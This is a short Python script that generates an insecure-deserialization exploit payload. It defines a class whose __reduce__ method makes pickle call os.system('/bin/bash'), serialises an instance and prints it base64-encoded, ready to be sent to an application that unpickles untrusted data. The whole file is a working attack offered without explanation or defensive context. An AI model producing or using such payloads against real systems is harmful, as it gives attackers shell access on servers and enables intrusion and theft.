import pickle
import os
import base64
class EvilPickle(object):
	def __reduce__(self):
		return (os.system, ('/bin/bash', ))

pickle_data = pickle.dumps(EvilPickle())
payload = base64.b64encode(pickle_data)
print (payload)
